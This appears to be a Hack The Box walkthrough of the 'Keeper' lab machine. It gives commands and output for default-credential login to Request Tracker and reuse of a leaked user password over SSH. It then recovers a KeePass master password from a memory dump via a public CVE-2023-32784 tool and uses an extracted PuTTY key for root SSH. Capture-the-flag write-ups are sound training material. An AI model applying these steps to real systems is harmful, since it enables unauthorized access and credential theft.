# Keeper: Hack The Box Walkthrough
<p align="center">
  <img src="https://img.shields.io/badge/HTB-Keeper-red?style=for-the-badge&logo=hackthebox&logoColor=white">
  <img src="https://img.shields.io/badge/Difficulty-Easy-green?style=for-the-badge">
  <img src="https://img.shields.io/badge/OS-Linux-blue?style=for-the-badge&logo=linux&logoColor=white">
</p>
## Machine Information

- **Machine:** Keeper
- **Platform:** Hack The Box
- **IP:** `10.129.229.41`

---

# Overview

Keeper is an easy Linux machine focused on:

- default credentials
- Request Tracker (RT) enumeration
- credential reuse
- exploitation of CVE-2023-32784
- SSH access using a recovered PuTTY private key

This walkthrough covers the full path from initial enumeration to root access.

---

# Table of Contents

- [TL;DR](#tldr)
- [Reconnaissance](#reconnaissance)
- [Web Enumeration](#web-enumeration)
- [Foothold](#foothold)
- [Privilege Escalation](#privilege-escalation)
- [Lessons Learned](#lessons-learned)
- [References](#references)
- [Conclusion](#conclusion)

---

# TL;DR

- Default credentials on RT
- Discovery of lnorgaard credentials
- SSH access as user
- KeePass dump exploitation using CVE-2023-32784
- Recovery of a PuTTY private key
- Root access through SSH

---

# Reconnaissance

## Nmap Scan

I started with a standard service enumeration scan:

```bash
nmap -sC -sV -oN nmap.txt 10.129.229.41
```

### Results

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3
80/tcp open  http    nginx 1.18.0 (Ubuntu)
```

The machine exposed:
- SSH on port 22
- HTTP on port 80

At this stage, the HTTP service looked like the most promising attack surface.

---

# Web Enumeration

Opening the website revealed a hostname:

```text
tickets.keeper.htb
```

I added it to `/etc/hosts`:

```bash
echo "10.129.229.41 tickets.keeper.htb" | sudo tee -a /etc/hosts
```

Browsing the site again showed a Request Tracker (RT) login portal.

RT instances are frequently deployed internally and sometimes retain weak or default credentials, making authentication attempts a logical next step.

---

# Foothold

## Default Credentials

I tested common/default credentials and successfully authenticated with:

```text
Username: root
Password: password
```

This granted administrator access to the RT instance.

The use of default credentials immediately exposed the entire ticketing environment.

---

## User Discovery

While navigating the RT interface, I found another user:

```text
lnorgaard
```

Inspecting the user profile revealed the user's initial password:

```text
Welcome2023!
```

This demonstrated a classic credential reuse/mismanagement issue.

---

## SSH Access

Using the discovered credentials, I connected through SSH:

```bash
ssh lnorgaard@tickets.keeper.htb
```

Connection successful.

---

## User Flag

Inside the user's home directory:

```bash
ls
```

Output:

```text
RT30000.zip
user.txt
```

I retrieved the user flag:

```bash
cat user.txt
```

```text
HTB{REDACTED}
```

---

# Privilege Escalation

## KeePass Investigation

The file `RT30000.zip` looked particularly interesting, so I copied it locally:

```bash
scp lnorgaard@10.129.229.41:/home/lnorgaard/RT30000.zip .
```

Then extracted it:

```bash
unzip RT30000.zip
```

Files obtained:

```text
KeePassDumpFull.dmp
passcodes.kdbx
```

These files strongly suggested a KeePass-related attack path.

A memory dump associated with a password manager is often highly sensitive and worth investigating carefully.

---

## CVE-2023-32784

Researching KeePass memory dump vulnerabilities led to:

```text
CVE-2023-32784
```

This vulnerability affects KeePass 2.X and allows partial recovery of the KeePass master password from memory dumps.

---

## Dump Analysis

I cloned the public PoC tool:

```bash
git clone https://github.com/vdohney/keepass-password-dumper.git
```

Then executed it against the dump:

```bash
cd keepass-password-dumper
dotnet run ../KeePassDumpFull.dmp
```

Output:

```text
Password candidates (character positions):
Unknown characters are displayed as "●"

Combined: ●{ø, Ï, ,, l, `, -, ', ], §, A, I, :, =, _, c, M}dgrød med fløde
```

The recovered password pattern strongly suggested the Danish phrase:

```text
rødgrød med fløde
```

---

## Opening the KeePass Database

I opened the KeePass database with KeePassXC:

```bash
keepassxc passcodes.kdbx
```

Master password:

```text
rødgrød med fløde
```

Inside the database, I found a PuTTY private key stored in the notes section of an entry.

Storing SSH private keys inside a password manager is common practice, but combined with a vulnerable memory dump, it became a full compromise vector.

---

## Rebuilding the PuTTY Key

I copied the entire PuTTY key content into a file:

```bash
nano key.ppk
```

The file started with:

```text
PuTTY-User-Key-File-3: ssh-rsa
Encryption: none
Comment: rsa-key-20230519
```

---

## Converting the Key

I installed PuTTY tools:

```bash
sudo apt install -y putty-tools
```

Then converted the key to OpenSSH format:

```bash
puttygen key.ppk -O private-openssh -o id_rsa
```

Permissions were fixed:

```bash
chmod 600 id_rsa
```

---

## Root Access

Using the converted SSH key:

```bash
ssh -i id_rsa root@10.129.229.41
```

Connection successful:

```text
root@keeper:~#
```

---

## Root Flag

Finally:

```bash
cat /root/root.txt
```

```text
HTB{REDACTED}
```

---

# Lessons Learned

- Default credentials remain a major security risk.
- Password managers can leak sensitive information through memory dumps.
- Credential reuse can quickly lead to full compromise.
- Sensitive SSH keys should never be stored insecurely.

---

# References

- https://github.com/vdohney/keepass-password-dumper
- https://nvd.nist.gov/vuln/detail/CVE-2023-32784

---

# Conclusion

Keeper is an excellent beginner-friendly machine demonstrating:
- the danger of default credentials
- insecure password management
- credential reuse
- real-world exploitation of KeePass memory disclosure vulnerabilities

The intended path combines:
1. web enumeration
2. RT misconfiguration
3. KeePass forensic analysis
4. SSH key recovery

A very enjoyable and realistic box overall.
